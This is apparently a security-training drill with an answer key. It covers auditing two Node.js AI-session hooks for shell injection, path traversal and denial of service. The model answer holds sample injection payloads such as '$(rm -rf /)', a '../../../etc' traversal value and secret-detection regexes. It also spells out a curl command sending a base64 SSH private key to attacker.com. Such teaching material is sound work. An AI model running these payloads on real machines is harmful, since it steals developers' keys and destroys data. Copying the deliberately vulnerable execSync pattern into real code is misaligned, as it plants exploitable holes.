---
drill_id: DR-SC-A-004-FULL
source_atom: SC-A-004
difficulty: intermediate
time_box_minutes: 30
modality: case
application: [COC]
---

# Audit Layer 3 Hooks for the Vulnerabilities They Enforce Against

## Setup

The practitioner receives two hook files from a session-lifecycle enforcement system. Both hooks run on every session start — they execute outside the AI's context window, with shell access, unconditionally. The practitioner also receives a three-class vulnerability checklist.

**Vulnerability checklist:**

| Class | Name              | Pattern                                                                                                                                     |
| ----- | ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| V1    | Shell injection   | `execSync` / `child_process.exec` / `subprocess.call(shell=True)` called with input derived from files, environment variables, or git state |
| V2    | Path traversal    | File read/write operations where the path is constructed from external input without sanitization (e.g., `../../../etc/passwd`)             |
| V3    | Denial of service | Unbounded file reads, missing timeouts on network calls, or loops without termination conditions                                            |

**Hook A — `session-start.js` (simplified from a real Kailash repo):**

```javascript
#!/usr/bin/env node
const { execSync, execFileSync } = require("child_process");
const fs = require("fs");
const path = require("path");

// 1. Read version config
const versionFile = path.join(__dirname, "../../.claude/VERSION");
const versionData = JSON.parse(fs.readFileSync(versionFile, "utf8"));

// 2. Check for updates
const remoteVersion = execSync(`curl -s ${versionData.version_url}/latest.json`)
  .toString()
  .trim();

// 3. Get current branch
const branch = execFileSync("git", ["rev-parse", "--abbrev-ref", "HEAD"])
  .toString()
  .trim();

// 4. Load project-specific rules
const rulesDir = path.join(__dirname, "../../.claude/rules");
const ruleFiles = fs.readdirSync(rulesDir);
for (const file of ruleFiles) {
  const content = fs.readFileSync(path.join(rulesDir, file), "utf8");
  if (content.length > 100000) {
    console.warn(`Rule file ${file} exceeds 100KB, skipping`);
    continue;
  }
}

// 5. Validate workspace config
const workspaceDir = process.env.CLAUDE_WORKSPACE_DIR || ".";
const configPath = path.join(workspaceDir, "workspace.json");
if (fs.existsSync(configPath)) {
  const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
  console.log(`Workspace: ${config.name}`);
}

// 6. Record session start
const logEntry = `${new Date().toISOString()} session-start ${branch}\n`;
fs.appendFileSync(path.join(__dirname, "../../.claude/session.log"), logEntry);
```

**Hook B — `pre-commit-validate.js` (simplified):**

```javascript
#!/usr/bin/env node
const { execFileSync } = require("child_process");
const fs = require("fs");
const path = require("path");

// 1. Get list of staged files
const staged = execFileSync("git", ["diff", "--cached", "--name-only"])
  .toString()
  .split("\n")
  .filter(Boolean);

// 2. Check each staged file against size limit
for (const file of staged) {
  const fullPath = path.resolve(file);
  const stats = fs.statSync(fullPath);
  if (stats.size > 10 * 1024 * 1024) {
    console.error(`BLOCKED: ${file} exceeds 10MB limit`);
    process.exit(1);
  }
}

// 3. Validate no secrets in staged files
const secretPatterns = [
  /sk-[a-zA-Z0-9]{48}/,
  /AKIA[A-Z0-9]{16}/,
  /-----BEGIN.*KEY-----/,
];
for (const file of staged) {
  const content = fs.readFileSync(file, "utf8");
  for (const pattern of secretPatterns) {
    if (pattern.test(content)) {
      console.error(`BLOCKED: ${file} contains a potential secret`);
      process.exit(1);
    }
  }
}

// 4. Run rule-format validation
const rulesDir = path.join(__dirname, "../../.claude/rules");
if (fs.existsSync(rulesDir)) {
  const rules = fs.readdirSync(rulesDir);
  for (const rule of rules) {
    const content = fs.readFileSync(path.join(rulesDir, rule), "utf8");
    if (!content.startsWith("#")) {
      console.warn(`WARNING: ${rule} does not start with a heading`);
    }
  }
}
```

## Task

1. For each hook (A and B), identify every point where external input enters the hook. External input means: data read from files, environment variables, git state, or network responses. Record each input source with its line reference.

2. For each external input, trace it to its consumption point(s). Classify each consumption as **SAFE**, **UNSAFE**, or **CONDITIONAL** with a one-sentence rationale. CONDITIONAL means the input is safe under normal operation but exploitable under specific conditions.

3. Identify the single most critical vulnerability across both hooks. Explain: (a) what the vulnerability is, (b) why it is worse in a hook than in application code, and (c) a concrete exploit scenario showing how an attacker could trigger it.

4. Propose a fix for every UNSAFE consumption point. Each fix must be a specific code change, not a general recommendation.

5. Identify at least one consumption point that looks suspicious but is actually safe (a false positive). Explain why dismissing it is correct.

## Model Answer

**1. External input inventory:**

**Hook A — `session-start.js`:**

| #   | Input Source                                | Type                 | Line Ref                                                         |
| --- | ------------------------------------------- | -------------------- | ---------------------------------------------------------------- |
| A1  | `.claude/VERSION` file contents             | File read            | `versionData = JSON.parse(fs.readFileSync(versionFile, 'utf8'))` |
| A2  | `versionData.version_url` (derived from A1) | Derived from file    | `execSync(\`curl -s ${versionData.version_url}/latest.json\`)`   |
| A3  | Network response from curl                  | Network              | `remoteVersion = execSync(...)`                                  |
| A4  | `git rev-parse` output                      | Git state            | `execFileSync('git', ['rev-parse', ...])`                        |
| A5  | `fs.readdirSync(rulesDir)` listing          | File system          | `const ruleFiles = fs.readdirSync(rulesDir)`                     |
| A6  | Rule file contents                          | File read            | `fs.readFileSync(path.join(rulesDir, file), 'utf8')`             |
| A7  | `CLAUDE_WORKSPACE_DIR` env var              | Environment variable | `process.env.CLAUDE_WORKSPACE_DIR`                               |
| A8  | `workspace.json` file contents              | File read            | `JSON.parse(fs.readFileSync(configPath, 'utf8'))`                |

**Hook B — `pre-commit-validate.js`:**

| #   | Input Source                           | Type        | Line Ref                                                   |
| --- | -------------------------------------- | ----------- | ---------------------------------------------------------- |
| B1  | `git diff --cached --name-only` output | Git state   | `execFileSync('git', ['diff', '--cached', '--name-only'])` |
| B2  | File stats of staged files             | File system | `fs.statSync(fullPath)`                                    |
| B3  | Staged file contents                   | File read   | `fs.readFileSync(file, 'utf8')`                            |
| B4  | Rules directory listing                | File system | `fs.readdirSync(rulesDir)`                                 |
| B5  | Rule file contents                     | File read   | `fs.readFileSync(path.join(rulesDir, rule), 'utf8')`       |

**2. Consumption point classification:**

**Hook A:**

| Input | Consumption                                                          | Classification  | Rationale                                                                                                                                                                                         |
| ----- | -------------------------------------------------------------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A1    | `JSON.parse(...)`                                                    | CONDITIONAL     | Malformed JSON crashes the hook (DoS), but this is a controlled local file, not attacker-supplied in normal operation.                                                                            |
| A2    | `execSync(\`curl -s ${versionData.version_url}/latest.json\`)`       | **UNSAFE (V1)** | `version_url` is interpolated into a shell command via `execSync`. A crafted VERSION file with `version_url: "$(rm -rf /)"` executes arbitrary commands. This is the canonical command injection. |
| A3    | Stored in `remoteVersion` variable, not further consumed dangerously | SAFE            | The network response is `.trim()`-ed and stored but not passed to any shell command or used as a file path.                                                                                       |
| A4    | `branch` used in string concatenation for log entry                  | SAFE            | `execFileSync` with an argument array does not invoke a shell. The output is used only in a log string, not in another shell command.                                                             |
| A5    | Iterated for file reads                                              | CONDITIONAL     | Directory listing is bounded by the filesystem. If `rulesDir` contained symlinks to unexpected locations, those would be followed. Low risk in practice.                                          |
| A6    | Read and checked for length                                          | SAFE            | Content is read and discarded; length check prevents unbounded processing. No content is executed or used in a path.                                                                              |
| A7    | `path.join(workspaceDir, 'workspace.json')`                          | **UNSAFE (V2)** | `CLAUDE_WORKSPACE_DIR` is unsanitized. Setting it to `../../../etc` would make `configPath` resolve outside the project. The hook then reads and parses whatever file exists at that path.        |
| A8    | `JSON.parse(...)` then `config.name` logged                          | CONDITIONAL     | If the path traversal in A7 succeeds, arbitrary file contents are parsed as JSON. The exposure is limited to a `console.log` of `config.name`, but the file read itself is the vulnerability.     |

**Hook B:**

| Input | Consumption                                          | Classification | Rationale                                                                                                                                                                                                                                                     |
| ----- | ---------------------------------------------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B1    | Used as file paths for `statSync` and `readFileSync` | CONDITIONAL    | `git diff` returns repo-relative paths. `path.resolve(file)` resolves them relative to `cwd`. A staged file with an unusual name (e.g., containing `..`) could resolve outside the repo, but git itself constrains staged file paths to within the work tree. |
| B2    | `stats.size` compared to numeric threshold           | SAFE           | A numeric comparison on a stat result. No path or content manipulation.                                                                                                                                                                                       |
| B3    | Content tested against regex patterns                | SAFE           | Regex patterns are hardcoded (not derived from external input). `readFileSync` on a staged file path is expected behavior. The only risk is the file being large (V3), but staged files are bounded by the size check in the previous step.                   |
| B4    | Iterated for file reads                              | SAFE           | Same as A5, but rules directory is a hardcoded relative path, not derived from external input.                                                                                                                                                                |
| B5    | Content checked for heading format                   | SAFE           | Content is read and tested with `startsWith('#')`. No execution, no path construction.                                                                                                                                                                        |

**3. Most critical vulnerability:**

The most critical vulnerability is **A2: command injection via `execSync` with `version_url`**.

**(a) What:** The `version_url` field from `.claude/VERSION` is string-interpolated into an `execSync` call. `execSync` passes the string through `/bin/sh`, which interprets shell metacharacters. A `.claude/VERSION` file containing `"version_url": "https://example.com/$(whoami)"` would execute `whoami` as a subprocess.

**(b) Why worse in a hook:** This hook runs on every session start — unconditionally, outside the AI's context window, with no AI oversight. Application code runs within the AI's session, where the AI can notice and flag suspicious behavior. A hook runs before the AI sees anything. The command injection executes silently on every session start and the AI never knows it happened. Additionally, hooks run with the user's full shell privileges, not within any sandbox.

**(c) Exploit scenario:** An attacker submits a pull request that modifies `.claude/VERSION` to include `"version_url": "https://legit-looking-url.com/api\"; curl -s https://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64) #"`. The code review focuses on the URL looking legitimate. When any developer starts a Claude Code session after pulling the branch, the hook exfiltrates their SSH private key to the attacker's server. The attack persists for every session start until someone audits the VERSION file.

**4. Fixes for UNSAFE consumption points:**

**Fix for A2 (command injection):**

Replace `execSync` (shell interpretation) with `execFileSync` (no shell):

```javascript
// BEFORE (UNSAFE):
const remoteVersion = execSync(`curl -s ${versionData.version_url}/latest.json`)
  .toString()
  .trim();

// AFTER (SAFE):
const remoteVersion = execFileSync("curl", [
  "-s",
  `${versionData.version_url}/latest.json`,
])
  .toString()
  .trim();
```

With `execFileSync`, the URL is passed as an argument to `curl`, not through a shell. Shell metacharacters like `$(...)` are treated as literal strings.

Additionally, validate `version_url` against an allowlist of expected URL patterns:

```javascript
const allowedHosts = ["registry.terrene.dev", "api.github.com"];
const url = new URL(versionData.version_url);
if (!allowedHosts.includes(url.hostname)) {
  throw new Error(`Blocked: version_url host ${url.hostname} not in allowlist`);
}
```

**Fix for A7 (path traversal):**

Resolve the workspace path and verify it is within the project root:

```javascript
// BEFORE (UNSAFE):
const workspaceDir = process.env.CLAUDE_WORKSPACE_DIR || ".";
const configPath = path.join(workspaceDir, "workspace.json");

// AFTER (SAFE):
const projectRoot = path.resolve(__dirname, "../..");
const workspaceDir = process.env.CLAUDE_WORKSPACE_DIR || ".";
const resolvedWorkspace = path.resolve(workspaceDir);
if (!resolvedWorkspace.startsWith(projectRoot)) {
  throw new Error(
    `Blocked: CLAUDE_WORKSPACE_DIR resolves outside project root`,
  );
}
const configPath = path.join(resolvedWorkspace, "workspace.json");
```

**5. False positive — correctly dismissed:**

**A4 (`git rev-parse` output)** looks suspicious because it takes output from an external process and uses it in a string that is written to a log file. A reviewer might flag this as a log injection vector — if `branch` contained newlines or control characters, the log could be corrupted. However, this is a false positive because: (a) `execFileSync` with an argument array does not invoke a shell, so the git output cannot trigger command injection; (b) `git rev-parse --abbrev-ref HEAD` returns a branch name that git itself constrains to valid ref characters (no spaces, no shell metacharacters); and (c) the log string is appended to a local file with no further processing — it is not fed to another command or displayed to users. The consumption is genuinely safe.

## Scoring

| Criterion                                                                                                | Points |
| -------------------------------------------------------------------------------------------------------- | ------ |
| All 8 external inputs in Hook A identified (A1-A8)                                                       | 2      |
| All 5 external inputs in Hook B identified (B1-B5)                                                       | 1      |
| A2 (command injection via `execSync`) correctly classified as UNSAFE with shell-interpretation rationale | 2      |
| A7 (path traversal via unsanitized env var) correctly classified as UNSAFE with traversal rationale      | 1      |
| Exploit scenario for A2 is concrete (shows attacker action, trigger condition, and impact)               | 2      |
| Fixes are specific code changes, not general advice ("validate inputs")                                  | 1      |
| At least one false positive correctly dismissed with structural reasoning (not just "it seems fine")     | 1      |
| Hook-vs-application-code reasoning present (explains why hook vulnerabilities are worse)                 | 1      |
| **Total**                                                                                                | **10** |

## Extensions

- **Variant A (V3 exploitation):** Add a third hook, `health-check.js`, that fetches a remote health endpoint with `http.get(versionData.health_url)` and no timeout. The practitioner must identify the denial-of-service vector: a crafted `health_url` pointing to a slow-responding server hangs the session-start hook indefinitely, blocking every session from starting. The fix requires a timeout parameter and a fallback path that allows the session to start even if the health check fails.
- **Variant B (audit-the-auditor):** Give the practitioner the secret-detection logic from Hook B (step 3) and ask them to audit the auditor: are the regex patterns sufficient to catch all common secret formats? The practitioner should identify that the patterns miss GitHub tokens (`ghp_*`), Slack tokens (`xoxb-*`), and generic base64-encoded secrets. The meta-lesson is that the enforcement hook itself has gaps in its detection coverage — the same safety-blindness pattern at a different level.
